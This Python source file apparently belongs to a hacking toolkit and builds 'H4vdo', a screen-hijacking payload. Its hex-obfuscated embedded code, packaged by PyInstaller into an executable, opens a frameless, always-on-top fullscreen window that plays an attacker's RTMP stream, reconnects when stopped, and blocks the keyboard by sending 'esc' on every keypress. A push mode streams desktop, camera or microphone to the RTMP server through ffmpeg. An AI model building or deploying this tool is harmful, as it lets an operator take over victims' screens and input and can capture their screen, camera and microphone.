#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

import subprocess
import sys,argparse,textwrap
from loguru import logger
import base64
import re
LOGO=f'''
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░        ░▒▓██████▓▒░
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░       ░▒▓█▓▒▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓████████▓▒░      ░▒▓████████▓▒░       ░▒▓█▓▒▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░         ░▒▓██▓▒░         ░▒▓███████▓▒░        ░▒▓██████▓▒░
                                        Maptnh@S-H4CK13
'''
def init_logger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green> | <level>{level: <8}</level> | {message}",
        level="INFO",
        colorize=True,
        backtrace=False,
        diagnose=False
    )

class core():
    def __init__(self,args):
        if args.RH and args.RP and args.PATH:
            args.PATH = args.PATH.strip('/')
            if args.PUSH:
                payload = self.__push_options(args.RH,args.RP,args.PATH)
                if payload:self.__push_stream(payload)
            else:
                self.__bytes_payload =b'\x69\x6D\x70\x6F\x72\x74\x20\x73\x79\x73\x0A\x66\x72\x6F\x6D\x20\x50\x79\x51\x74\x35\x2E\x51\x74\x57\x69\x64\x67\x65\x74\x73\x20\x69\x6D\x70\x6F\x72\x74\x20\x51\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2C\x20\x51\x4D\x61\x69\x6E\x57\x69\x6E\x64\x6F\x77\x2C\x20\x51\x56\x42\x6F\x78\x4C\x61\x79\x6F\x75\x74\x2C\x20\x51\x57\x69\x64\x67\x65\x74\x0A\x66\x72\x6F\x6D\x20\x50\x79\x51\x74\x35\x2E\x51\x74\x43\x6F\x72\x65\x20\x69\x6D\x70\x6F\x72\x74\x20\x51\x54\x69\x6D\x65\x72\x2C\x51\x74\x0A\x69\x6D\x70\x6F\x72\x74\x20\x76\x6C\x63\x0A\x69\x6D\x70\x6F\x72\x74\x20\x6B\x65\x79\x62\x6F\x61\x72\x64\x0A\x69\x6D\x70\x6F\x72\x74\x20\x62\x61\x73\x65\x36\x34\x0A\x0A\x63\x6C\x61\x73\x73\x20\x43\x75\x73\x74\x6F\x6D\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x28\x51\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x29\x3A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x5F\x5F\x69\x6E\x69\x74\x5F\x5F\x28\x73\x65\x6C\x66\x2C\x20\x61\x72\x67\x76\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x75\x70\x65\x72\x28\x29\x2E\x5F\x5F\x69\x6E\x69\x74\x5F\x5F\x28\x61\x72\x67\x76\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x69\x6E\x73\x74\x61\x6C\x6C\x45\x76\x65\x6E\x74\x46\x69\x6C\x74\x65\x72\x28\x73\x65\x6C\x66\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6B\x65\x79\x5F\x63\x68\x65\x63\x6B\x5F\x74\x69\x6D\x65\x72\x20\x3D\x20\x51\x54\x69\x6D\x65\x72\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6B\x65\x79\x5F\x63\x68\x65\x63\x6B\x5F\x74\x69\x6D\x65\x72\x2E\x74\x69\x6D\x65\x6F\x75\x74\x2E\x63\x6F\x6E\x6E\x65\x63\x74\x28\x73\x65\x6C\x66\x2E\x63\x68\x65\x63\x6B\x5F\x6B\x65\x79\x73\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6B\x65\x79\x5F\x63\x68\x65\x63\x6B\x5F\x74\x69\x6D\x65\x72\x2E\x73\x74\x61\x72\x74\x28\x31\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x6B\x65\x79\x62\x6F\x61\x72\x64\x2E\x68\x6F\x6F\x6B\x28\x73\x65\x6C\x66\x2E\x6F\x6E\x5F\x6B\x65\x79\x5F\x65\x76\x65\x6E\x74\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x6F\x6E\x5F\x6B\x65\x79\x5F\x65\x76\x65\x6E\x74\x28\x73\x65\x6C\x66\x2C\x20\x65\x76\x65\x6E\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x6B\x65\x79\x62\x6F\x61\x72\x64\x2E\x73\x65\x6E\x64\x28\x27\x65\x73\x63\x27\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x63\x68\x65\x63\x6B\x5F\x6B\x65\x79\x73\x28\x73\x65\x6C\x66\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x70\x61\x73\x73\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x65\x76\x65\x6E\x74\x46\x69\x6C\x74\x65\x72\x28\x73\x65\x6C\x66\x2C\x20\x6F\x62\x6A\x2C\x20\x65\x76\x65\x6E\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6E\x20\x73\x75\x70\x65\x72\x28\x29\x2E\x65\x76\x65\x6E\x74\x46\x69\x6C\x74\x65\x72\x28\x6F\x62\x6A\x2C\x20\x65\x76\x65\x6E\x74\x29\x0A\x0A\x63\x6C\x61\x73\x73\x20\x46\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x56\x69\x64\x65\x6F\x50\x6C\x61\x79\x65\x72\x28\x51\x4D\x61\x69\x6E\x57\x69\x6E\x64\x6F\x77\x29\x3A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x5F\x5F\x69\x6E\x69\x74\x5F\x5F\x28\x73\x65\x6C\x66\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x75\x70\x65\x72\x28\x29\x2E\x5F\x5F\x69\x6E\x69\x74\x5F\x5F\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x65\x74\x57\x69\x6E\x64\x6F\x77\x54\x69\x74\x6C\x65\x28\x22\x3F\x3F\x3F\x3F\x22\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x65\x74\x47\x65\x6F\x6D\x65\x74\x72\x79\x28\x31\x30\x30\x2C\x20\x31\x30\x30\x2C\x20\x38\x30\x30\x2C\x20\x36\x30\x30\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x65\x74\x57\x69\x6E\x64\x6F\x77\x46\x6C\x61\x67\x73\x28\x51\x74\x2E\x46\x72\x61\x6D\x65\x6C\x65\x73\x73\x57\x69\x6E\x64\x6F\x77\x48\x69\x6E\x74\x20\x7C\x20\x51\x74\x2E\x57\x69\x6E\x64\x6F\x77\x53\x74\x61\x79\x73\x4F\x6E\x54\x6F\x70\x48\x69\x6E\x74\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x68\x6F\x77\x46\x75\x6C\x6C\x53\x63\x72\x65\x65\x6E\x28\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x69\x6E\x73\x74\x61\x6E\x63\x65\x20\x3D\x20\x76\x6C\x63\x2E\x49\x6E\x73\x74\x61\x6E\x63\x65\x28\x27\x2D\x2D\x71\x75\x69\x65\x74\x27\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x20\x3D\x20\x73\x65\x6C\x66\x2E\x69\x6E\x73\x74\x61\x6E\x63\x65\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x5F\x6E\x65\x77\x28\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x77\x69\x64\x67\x65\x74\x20\x3D\x20\x51\x57\x69\x64\x67\x65\x74\x28\x73\x65\x6C\x66\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x65\x74\x43\x65\x6E\x74\x72\x61\x6C\x57\x69\x64\x67\x65\x74\x28\x73\x65\x6C\x66\x2E\x77\x69\x64\x67\x65\x74\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6C\x61\x79\x6F\x75\x74\x20\x3D\x20\x51\x56\x42\x6F\x78\x4C\x61\x79\x6F\x75\x74\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x77\x69\x64\x67\x65\x74\x2E\x73\x65\x74\x4C\x61\x79\x6F\x75\x74\x28\x73\x65\x6C\x66\x2E\x6C\x61\x79\x6F\x75\x74\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x75\x72\x6C\x20\x3D\x20\x62\x61\x73\x65\x36\x34\x2E\x62\x36\x34\x64\x65\x63\x6F\x64\x65\x28\x27\x40\x42\x36\x34\x50\x41\x59\x4C\x4F\x41\x44\x27\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x27\x75\x74\x66\x2D\x38\x27\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x65\x74\x75\x70\x5F\x76\x6C\x63\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x76\x65\x6E\x74\x5F\x6D\x61\x6E\x61\x67\x65\x72\x20\x3D\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x65\x76\x65\x6E\x74\x5F\x6D\x61\x6E\x61\x67\x65\x72\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x76\x65\x6E\x74\x5F\x6D\x61\x6E\x61\x67\x65\x72\x2E\x65\x76\x65\x6E\x74\x5F\x61\x74\x74\x61\x63\x68\x28\x76\x6C\x63\x2E\x45\x76\x65\x6E\x74\x54\x79\x70\x65\x2E\x4D\x65\x64\x69\x61\x50\x6C\x61\x79\x65\x72\x45\x6E\x64\x52\x65\x61\x63\x68\x65\x64\x2C\x20\x73\x65\x6C\x66\x2E\x6F\x6E\x5F\x6D\x65\x64\x69\x61\x5F\x65\x6E\x64\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x76\x65\x6E\x74\x5F\x6D\x61\x6E\x61\x67\x65\x72\x2E\x65\x76\x65\x6E\x74\x5F\x61\x74\x74\x61\x63\x68\x28\x76\x6C\x63\x2E\x45\x76\x65\x6E\x74\x54\x79\x70\x65\x2E\x4D\x65\x64\x69\x61\x50\x6C\x61\x79\x65\x72\x45\x6E\x63\x6F\x75\x6E\x74\x65\x72\x65\x64\x45\x72\x72\x6F\x72\x2C\x20\x73\x65\x6C\x66\x2E\x6F\x6E\x5F\x6D\x65\x64\x69\x61\x5F\x65\x72\x72\x6F\x72\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x65\x76\x65\x6E\x74\x5F\x6D\x61\x6E\x61\x67\x65\x72\x2E\x65\x76\x65\x6E\x74\x5F\x61\x74\x74\x61\x63\x68\x28\x76\x6C\x63\x2E\x45\x76\x65\x6E\x74\x54\x79\x70\x65\x2E\x4D\x65\x64\x69\x61\x50\x6C\x61\x79\x65\x72\x53\x74\x6F\x70\x70\x65\x64\x2C\x20\x73\x65\x6C\x66\x2E\x6F\x6E\x5F\x6D\x65\x64\x69\x61\x5F\x73\x74\x6F\x70\x70\x65\x64\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x5F\x74\x69\x6D\x65\x72\x20\x3D\x20\x51\x54\x69\x6D\x65\x72\x28\x73\x65\x6C\x66\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x5F\x74\x69\x6D\x65\x72\x2E\x74\x69\x6D\x65\x6F\x75\x74\x2E\x63\x6F\x6E\x6E\x65\x63\x74\x28\x73\x65\x6C\x66\x2E\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x28\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x73\x65\x74\x75\x70\x5F\x76\x6C\x63\x28\x73\x65\x6C\x66\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x20\x3D\x20\x73\x65\x6C\x66\x2E\x69\x6E\x73\x74\x61\x6E\x63\x65\x2E\x6D\x65\x64\x69\x61\x5F\x6E\x65\x77\x28\x73\x65\x6C\x66\x2E\x75\x72\x6C\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x73\x65\x74\x5F\x6D\x65\x64\x69\x61\x28\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x29\x0A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x73\x79\x73\x2E\x70\x6C\x61\x74\x66\x6F\x72\x6D\x2E\x73\x74\x61\x72\x74\x73\x77\x69\x74\x68\x28\x27\x6C\x69\x6E\x75\x78\x27\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x73\x65\x74\x5F\x78\x77\x69\x6E\x64\x6F\x77\x28\x69\x6E\x74\x28\x73\x65\x6C\x66\x2E\x77\x69\x64\x67\x65\x74\x2E\x77\x69\x6E\x49\x64\x28\x29\x29\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6C\x69\x66\x20\x73\x79\x73\x2E\x70\x6C\x61\x74\x66\x6F\x72\x6D\x20\x3D\x3D\x20\x22\x77\x69\x6E\x33\x32\x22\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x73\x65\x74\x5F\x68\x77\x6E\x64\x28\x69\x6E\x74\x28\x73\x65\x6C\x66\x2E\x77\x69\x64\x67\x65\x74\x2E\x77\x69\x6E\x49\x64\x28\x29\x29\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6C\x69\x66\x20\x73\x79\x73\x2E\x70\x6C\x61\x74\x66\x6F\x72\x6D\x20\x3D\x3D\x20\x22\x64\x61\x72\x77\x69\x6E\x22\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x73\x65\x74\x5F\x6E\x73\x6F\x62\x6A\x65\x63\x74\x28\x69\x6E\x74\x28\x73\x65\x6C\x66\x2E\x77\x69\x64\x67\x65\x74\x2E\x77\x69\x6E\x49\x64\x28\x29\x29\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x6F\x6E\x5F\x6D\x65\x64\x69\x61\x5F\x65\x6E\x64\x28\x73\x65\x6C\x66\x2C\x20\x65\x76\x65\x6E\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x28\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x6F\x6E\x5F\x6D\x65\x64\x69\x61\x5F\x65\x72\x72\x6F\x72\x28\x73\x65\x6C\x66\x2C\x20\x65\x76\x65\x6E\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x28\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x6F\x6E\x5F\x6D\x65\x64\x69\x61\x5F\x73\x74\x6F\x70\x70\x65\x64\x28\x73\x65\x6C\x66\x2C\x20\x65\x76\x65\x6E\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x28\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x72\x65\x63\x6F\x6E\x6E\x65\x63\x74\x28\x73\x65\x6C\x66\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x73\x74\x6F\x70\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x73\x65\x74\x75\x70\x5F\x76\x6C\x63\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x28\x29\x0A\x0A\x20\x20\x20\x20\x64\x65\x66\x20\x63\x6C\x6F\x73\x65\x45\x76\x65\x6E\x74\x28\x73\x65\x6C\x66\x2C\x20\x65\x76\x65\x6E\x74\x29\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6C\x66\x2E\x6D\x65\x64\x69\x61\x5F\x70\x6C\x61\x79\x65\x72\x2E\x73\x74\x6F\x70\x28\x29\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x65\x76\x65\x6E\x74\x2E\x61\x63\x63\x65\x70\x74\x28\x29\x0A\x0A\x64\x65\x66\x20\x6D\x61\x69\x6E\x28\x29\x3A\x0A\x20\x20\x20\x20\x61\x70\x70\x20\x3D\x20\x43\x75\x73\x74\x6F\x6D\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x28\x73\x79\x73\x2E\x61\x72\x67\x76\x29\x0A\x20\x20\x20\x20\x70\x6C\x61\x79\x65\x72\x20\x3D\x20\x46\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x56\x69\x64\x65\x6F\x50\x6C\x61\x79\x65\x72\x28\x29\x0A\x20\x20\x20\x20\x70\x6C\x61\x79\x65\x72\x2E\x73\x68\x6F\x77\x28\x29\x0A\x20\x20\x20\x20\x73\x79\x73\x2E\x65\x78\x69\x74\x28\x61\x70\x70\x2E\x65\x78\x65\x63\x5F\x28\x29\x29\x0A\x0A\x69\x66\x20\x5F\x5F\x6E\x61\x6D\x65\x5F\x5F\x20\x3D\x3D\x20\x22\x5F\x5F\x6D\x61\x69\x6E\x5F\x5F\x22\x3A\x0A\x20\x20\x20\x20\x6D\x61\x69\x6E\x28\x29'

                self.__generate_payload(args.RH,args.RP,args.PATH)
        else:
            logger.warning("The provided parameters are incorrect!")


    def __push_options(self,ip,port,path):
        def list_ffmpeg_devices():
            result = subprocess.run(
                ["./Plugin/H4vdo/exe", "-list_devices", "true", "-f", "dshow", "-i", "dummy"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            try:
                output = result.stderr.decode('utf-8')
            except UnicodeDecodeError:
                output = result.stderr.decode('gbk')

            video_devices = re.findall(r'\[dshow @ .+\]  "(.*?)"', output)
            print("===Camera Name== ")
            for v_name in video_devices:
                print(f'{v_name}')
            print('-'*20)
        ops = int(input("[0] Push media mp4 [1] Push desktop screen [2] Push camera > "))
        if 0<=ops<=2:
            if ops == 0:
                mp4 = input("MP4 file path: ")
                payload= f'./Plugin/H4vdo/ffmpeg.exe -re -stream_loop -1 -i {mp4} -c:v libx264 -preset veryfast -maxrate 2000k -bufsize 4000k -pix_fmt yuv420p -c:a aac -b:a 128k -f flv rtmp://{ip}:{port}/{path}'
                logger.info("Pushing RTMP stream (MP4) ...")
                return payload
            elif ops == 1:
                list_ffmpeg_devices()
                microphone = input("Enter microphone name: ")
                payload= f'./Plugin/H4vdo/ffmpeg.exe -f gdigrab -framerate 30 -i desktop -f dshow -i audio="{microphone}" -c:v libx264 -preset veryfast -maxrate 2000k -bufsize 4000k -pix_fmt yuv420p -c:a aac -b:a 128k -f flv rtmp://{ip}:{port}/{path}'
                logger.info("Pushing RTMP stream (Desktop) ...")
                return payload
            elif ops == 2:
                list_ffmpeg_devices()
                camera = input("Enter camera name: ")
                microphone = input("Enter microphone name: ")
                payload= f'./Plugin/H4vdo/ffmpeg.exe -f dshow -i video="{camera}" -f dshow -i audio="{microphone}" -c:v libx264 -preset veryfast -maxrate 2000k -bufsize 4000k -pix_fmt yuv420p -c:a aac -b:a 128k -f flv rtmp://{ip}:{port}/{path}'
                logger.info("Pushing RTMP stream (Camera) ...")
                return payload
        else:
            logger.error("Incorrect parameter options !")

    def __push_stream(self, payload):
        try:
            result = subprocess.run(
                payload,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE
            )
            if result.returncode != 0:
                raise subprocess.CalledProcessError(result.returncode, result.args, output=result.stdout, stderr=result.stderr)
        except subprocess.CalledProcessError as e:
            if e.stderr:
                logger.error(f"RTMP error: {e.stderr.decode('utf-8')}")
            else:
                logger.error(f"RTMP error: Unknown error occurred.")
            return
        except Exception as e:
            logger.error(f"Error calling RTMP: {e}")
            return
        else:
            logger.info("Done.")


    def __generate_file(self,note):
        logger.info("Generating File...")
        try:
            with open('./Plugin/H4vdo/H4vdo_debug.py','w',encoding='utf-8')as f:
                f.write(note)
        except Exception as e:
            logger.error("Generate File fail ! ")
            return False
        else:
            logger.info("Generate File completed.")

    def __generate_payload(self, host, port, path):
        logger.info("Generating Payload...")
        rtmp = f'rtmp://{host}:{port}/{path}'
        try:
            b_rtmp = base64.b64encode(rtmp.encode('utf-8')).decode('utf-8')
            self.__generate_file(self.__bytes_payload.decode('utf-8').replace('@B64PAYLOAD',b_rtmp))
        except Exception as e:
            logger.error(f"Generate Error: {e}")
            return
        else:

            try:
                result = subprocess.run(
                    'pyinstaller --distpath "./Device/Output/H4vdo/" --workpath "./Plugin/H4vdo/" --add-data "./Plugin/H4vdo/libvlc.dll;." --add-data "./Plugin/H4vdo/libvlccore.dll;." --add-data "./Plugin/H4vdo/plugins*;plugins" ./Plugin/H4vdo/H4vdo_debug.py',
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                if result.returncode != 0:
                    raise subprocess.CalledProcessError(result.returncode, result.args, output=result.stdout, stderr=result.stderr)
            except subprocess.CalledProcessError as e:
                logger.error(f"Pyinstaller failed with error: {e.stderr.decode('utf-8')}")
                return
            except Exception as e:
                logger.error(f"Error calling pyinstaller: {e}")
                return
            else:
                logger.info("Generate Payload completed, in ./Device/Output/H4vdo/")

def main():
    init_logger()
    print(LOGO)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {H4vdo} -rh <RTMP_Server_IP> -rp <RTMP_Server_Port_1935> -path <Player_Path># Player rtmp
            python3 {H4vdo} -rh <RTMP_Server_IP> -rp <RTMP_Server_Port_1935> -path <Player_Path> -push # Enabling this option means streaming
            '''.format(H4vdo = sys.argv[0]
                )))
    parser.add_argument('-rh', '--RH', default='',help='RTMP server ip')
    parser.add_argument('-rp', '--RP', default='1935', help='RTMP server port')
    parser.add_argument('-path', '--PATH', default='', help='Player path')
    parser.add_argument('-push','--PUSH',action='store_true', help='Enabling this option means streaming')
    args = parser.parse_args()
    core(args)

if __name__ == '__main__':
    main()
